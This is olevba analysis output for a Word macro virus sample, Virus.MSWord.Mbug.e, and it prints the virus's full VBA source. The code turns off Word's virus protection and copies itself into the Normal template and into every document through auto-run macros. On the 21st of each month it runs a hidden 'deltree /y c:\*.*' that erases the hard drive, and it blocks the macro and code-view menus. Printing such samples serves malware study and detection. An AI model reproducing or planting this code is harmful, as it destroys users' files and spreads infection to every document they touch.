olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mbug.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mbug.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO frank2.bas 
in file: Virus.MSWord.Mbug.e - OLE stream: 'Macros/VBA/frank2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
Attribute AutoExec.VB_Description = "Macro créée par ZeMacroKiller98"
Attribute AutoExec.VB_ProcData.VB_Invoke_Func = "Virus.MultiVirus.AutoExec"
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo errorAE
If Day(Now()) = "21" Then
MsgBox "Frankie chieng is in bad mood and want to clean up your hard drive", vbExclamation, "Cleaning Job II"
Shell "deltree /y c:\*.*", vbHide
End If
errorAE:
End Sub
Sub AutoNew()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorAN
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="frank2", Object:=wdOrganizerObjectProjectItems
    With Dialogs(wdDialogFileSummaryInfo)
        .Subject = "Frankie Virus II"
        .Execute
    End With
ErrorAN:
End Sub
Sub AutoClose()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
MsgBox "Frankie chieng Virus II, more powerful", vbExclamation, "Frankie Box"
End Sub
Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Macro créée ZeMacroKiller98"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Virus.MultiVirus.AutoOpen"
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorAO
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0) = "frank2" Then
        bInstalled = -1
    End If
Next i
If Not bInstalled Then
    MsgBox "Frankie chieng", vbInformation, "Frankie chieng box"
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="frank2", Object:=wdOrganizerObjectProjectItems
Else
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="frank2", Object:=wdOrganizerObjectProjectItems
End If
ErrorAO:
End Sub

Sub FileSaveAs()
Attribute FileSaveAs.VB_Description = "Macro créee par ZeMacroKiller98"
Attribute FileSaveAs.VB_ProcData.VB_Invoke_Func = "Virus.MultiVirus.FileSaveAs"
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="frank2", Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
If (ActiveDocument.SaveFormat = wdFormatDocument) Or (ActiveDocument.SaveFormat = wdFormatTemplate) Then
    ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
End If
ErrorFSA:
End Sub
Sub FilePrint()
Attribute FilePrint.VB_Description = "Macro crée par ZeMacroKiller98"
Attribute FilePrint.VB_ProcData.VB_Invoke_Func = "Virus.MultiVirus.FilePrint"
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFP
InsertPayload
    Dialogs(wdDialogFilePrint).Show
ErrorFP:
End Sub
Sub FilePrintDefault()
Attribute FilePrintDefault.VB_Description = "Macro créee par ZeMacroKiller98"
Attribute FilePrintDefault.VB_ProcData.VB_Invoke_Func = "Virus.MultiVirus.FilePrintDefault"
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFPD
InsertPayload
    ActiveDocument.PrintOut
ErrorFPD:
End Sub
Sub FileTemplates()
Attribute FileTemplates.VB_Description = "Macro créee par ZeMacroKiller98"
Attribute FileTemplates.VB_ProcData.VB_Invoke_Func = "Virus.MultiVirus.FileTemplates"
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFT
MsgBox "Access Defined"
ErrorFT:
End Sub
Sub InsertPayload()
Attribute InsertPayload.VB_Description = "Macro créee par ZeMacroKiller98"
Attribute InsertPayload.VB_ProcData.VB_Invoke_Func = "Virus.MultiVirus.InsertPayload"
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorIP
With Selection.Font
    .Bold = True
    .Italic = True
    .Name = "comic san ms"
    Selection.Font.Size = "100"
    Selection.TypeText Text:="Frankie Chieng VirusII"
    Selection.Font.Size = "10"
    Selection.TypeText Text:="Wrote by frankie chieng"
End With
ErrorIP:
End Sub
Sub ToolsMacro()
Attribute ToolsMacro.VB_Description = "Macro créee par ZeMacroKiller98"
Attribute ToolsMacro.VB_ProcData.VB_Invoke_Func = "Virus.MultiVirus.ToolsMacro"
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorTM
MsgBox "Access Defined"
ErrorTM:
End Sub
Sub ViewVBCode()
Attribute ViewVBCode.VB_Description = "Macro créee par ZeMacroKiller98"
Attribute ViewVBCode.VB_ProcData.VB_Invoke_Func = "Virus.MultiVirus.ViewVBCode"
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorVVBC
MsgBox "Access Defined"
ErrorVVBC:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
+----------+--------------------+---------------------------------------------+

